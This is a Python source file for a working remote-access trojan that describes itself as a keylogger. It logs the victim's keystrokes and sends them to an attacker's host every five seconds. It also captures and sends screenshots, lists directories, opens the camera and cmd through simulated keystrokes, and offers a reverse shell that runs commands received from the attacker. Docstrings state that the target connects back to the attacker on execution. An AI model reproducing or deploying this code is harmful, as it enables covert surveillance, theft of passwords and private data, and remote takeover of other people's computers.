import string
import requests
import socket
import subprocess
import shlex

from threading import Thread
from typing import Dict, Callable
from time import sleep
from PIL import ImageGrab
from os.path import exists
from os import remove
from pynput import keyboard




#Globals, these two variables should not be altered
__aplhanum = list(string.ascii_letters+string.digits)
__data = []
__add_data = ""
#Hardcoded values
HOST="127.0.0.1"
PORT=5000
IMAGE_NAME = "img.jpeg"

def __screenshot()->None:
   """Takes screenshot of screen
      
      :return: None
   """
   image = ImageGrab.grab()
   image.save(IMAGE_NAME)
   with open(IMAGE_NAME, "rb") as fp:
        data = fp.read()
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
            s_sock.connect((HOST,PORT+2))
            s_sock.send(data)
   
   if exists(IMAGE_NAME):
           remove(IMAGE_NAME)
   else:
        pass  

#Listens for keystrokes
def listen(port:int =80)->None:
  """This function listens and sends  keystrokes to attacker until Esc key is pressed
    
     :param port: TCP destinatoin port, defaults to 80
     :return : None
  """
  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
       ksock.connect((HOST,port+1))
       def send_keystroke():
           if len(__data) > 0:
             payload = "".join(__data)
             try:
                 ksock.send(payload.encode())    
             except:
               pass
             
             __data.clear()
           else:
               pass
           
           #Calls itself each time it is called and waits 5 seconds
           thread= Thread(target=send_keystroke,daemon=True)
           sleep(5)
           thread.start()
       
       #On key down
       def on_press(key):
           pass
         
       #On key release
       def on_release(key):
        try:
           if str(key).strip("\'") in __aplhanum:
              globals()["__data"].append(str(key).strip("\'"))
           elif key == keyboard.Key.space:
              globals()["__data"].append(" ") 
           elif key == keyboard.Key.enter:
               globals()["__data"].append("\n")
           elif key == keyboard.Key.tab:
               globals()["__data"].append("\t")
           elif key == keyboard.Key.backspace and len(__data) > 0 :
               globals()["__data"].pop()
           elif key == keyboard.Key.esc:
               return False
           else :
               pass
        except :
               pass    
       
       with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
           send_keystroke()
           listener.join()
        


#list item in home directory of user
def list_dir(sock)->None:
      """List the items in the home directory of user
         
         :param: socket like object
         :Return: None
      """
      dir_items = subprocess.run("dir",shell=True,capture_output=True,text=True)
      globals()["__add_data"] += dir_items.stdout
      sock.send(__add_data.encode())
      globals()["__add_data"] = ""


#Opens cmd(Windows only)
def open_cmd()->None:
    """This functions opens CMD
       :return: None

       *NOTE*: This is windows only
    """
    try:
       Keyboard = keyboard.Controller()
       with Keyboard.pressed(keyboard.Key.cmd):
            Keyboard.tap("r")
       sleep(0.5)
       Keyboard.type("cmd")
       sleep(0.5)
       Keyboard.tap(keyboard.Key.enter)   
    except:
       print("error") 


def open_camera()->None:
    """This functions opens camera app
       :return: None

       *NOTE*: This is windows only
    """
    try:
       Keyboard = keyboard.Controller()
       with Keyboard.pressed(keyboard.Key.cmd):
            Keyboard.tap("r")
       sleep(0.5)
       Keyboard.type("microsoft.windows.camera:")
       sleep(0.5)
       Keyboard.tap(keyboard.Key.alt)   
       Keyboard.tap(keyboard.Key.f4)   
    except:
       print("error")

#Opens any existing app(Windows only)    
def Open(app:str)->None:
    """This functions opens an existing application
       
       :param app: Application name
       :return: None
       
       Example:
          keylogger.open("notepad")
       
       *NOTE*: This is windows only
    """
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap("r")
    sleep(2)
    Keyboard.type(app)
    sleep(0.5)
    Keyboard.tap(keyboard.Key.enter)
    sleep(5)

#Simultate keystrokes
def send_key(data:str)->None:
    """This function simulates keystrokes
       
       :param data: String of text
       :return: None

       Example:
          keylogger.send("Hello World)
    """
    Keyboard = keyboard.Controller()
    Keyboard.type(data)
    Keyboard.tap(keyboard.Key.enter)

def full_screen()->None:
    """This function causes active windows to be in fullscreen, this
       can be used after, for example, calling open notepad
       *NOTE*:Windows only

       :return: None
    """
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap(keyboard.Key.up)

def exit_prog()->None:
    """This function causes active windows to be closed, this
       can be used after, for example, calling open notepad, riting something to it and saving it
       *NOTE*:Windows only

       :return: None
    """
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.alt):
         Keyboard.tap(keyboard.Key.f4)

def minimise()->None:
    """This function causes active windows to be minimised, this
       can be used after, for example, calling open notepad, writing something to it and saving it
       *NOTE*:Windows only

       :return: None
    """
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap(keyboard.Key.down)
def enter()->None:
    """This function simply emulates the enter key

       :return: None
    """
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.enter)

def right()->None:
    """This function simply emulates the right key

       :return: None
    """
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.right)


def left()->None:
    """This function simply emulates the left key

       :return: None
    """
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.left)

def tcp_reverse(sock)->None:
    
    while True:
          incoming_command = shlex.split(sock.recv(1024).decode())
          try:  
            if incoming_command[0] == "exit":
               break
          except IndexError:
               continue
          output = subprocess.run(incoming_command,shell=True,capture_output=True,text=True)
          if output.returncode == 0:
             sock.send(output.stdout.encode())
          else:
             sock.send(output.stderr.encode())

#Maps simple functions(With no arguements)
commands_no_args: Dict[str, Callable] = {
  "screenshot": __screenshot,
  "cmd": open_cmd,
  "camera": open_camera,
  "fullscreen": full_screen,
  "exit_prog": exit_prog,
  "minimise":minimise,
  "enter": enter,
  "right":right,
  "left":left
  }

#Maps function whick takes socket as argument
commands_sock_arg: Dict[str, Callable] = {
    "list":list_dir,
    "tcp_reverse":tcp_reverse
}

#Maps function whick takes arguements, excluding socket like objects as arguement
commands_args: Dict[str, Callable] = {
    "open": Open,
    "type": send_key
}

def tcp_connection()->None:
    """Initiates TCP connection to attacker Host on port Port, The values should be hardcoded so that target connects to attacker up executing the file
       Moreover, data received by socket is decoded and read to execute a specific function(no pun intented :))
       :return: None
    """
    with socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM) as s:
         s.connect((HOST,PORT))
         while True:
            try:
               command = s.recv(1024).decode().rstrip("\n")
               if command in commands_no_args:
                  commands_no_args[command]() 
               elif command in commands_sock_arg:
                    commands_sock_arg[command](s)   
               elif shlex.split(command)[0].lower() in commands_args:
                    commands_args[shlex.split(command)[0].lower()](shlex.split(command)[1])
               elif command == "break":
                    break
               else:
                   s.send("Invalid command !".encode())
            except IndexError:
                s.send("Invalid arguement format, see documentation.".encode())         
                pass

if __name__ == "__main__":
    tcp_thread = Thread(target=tcp_connection,daemon=True)
    listener_thread = Thread(target=listen,args=(PORT,))
    tcp_thread.start()
    listener_thread.start()
    tcp_thread.join()
    listener_thread.join()
    exit()
